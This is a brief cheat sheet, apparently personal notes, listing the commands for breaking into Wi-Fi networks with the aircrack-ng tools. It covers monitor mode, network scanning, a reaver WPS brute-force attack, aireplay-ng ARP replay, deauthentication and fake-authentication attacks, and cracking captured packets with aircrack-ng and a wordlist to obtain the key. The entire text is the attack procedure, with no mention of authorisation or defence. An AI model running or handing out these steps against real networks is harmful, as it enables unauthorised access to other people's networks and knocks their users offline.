1. start monitor:
  sudo airmon-ng start wlan0
  (you can kill all the process using wlan0)

2. dump wifi info:
  sudo airodump-ng mon0

3. pick a wifi and get bssid, channel...

4. wpa / wpa2:
  using reaver, wps attack:
    use the bssid picked above
    or use 
    sudo wash -i mon0 -c $channel -C
    to find vulnerable wifi
    
    sudo reaver -i mon0 -c $channel -b $bssid -vv

  password is WPA-PSK field

4. wep / wpa / wpa2
  gather info by sniffing packets: 
    sudo airodump-ng -w $filename -c $channel -b $bssid mon0

  open another terminal and start a type of a attack (try to get handshake or more packet):
    a. arp attack: 
      sudo aireplay-ng -3 -b $bssid mon0
    
    b. deauthentication attack:
      sudo aireplay-ng -0 0 -a $bssid mon0

    c. fake authentication attack:
      sudo aireplay-ng -1 0 -a $bssid -h $(whatever_host_mac) -e $essid mon0

  after collect over 20000 packets, we can solve the initial vector:
    sudo aircrack-ng -w $(passwordList) $(filename).cap

  get the key
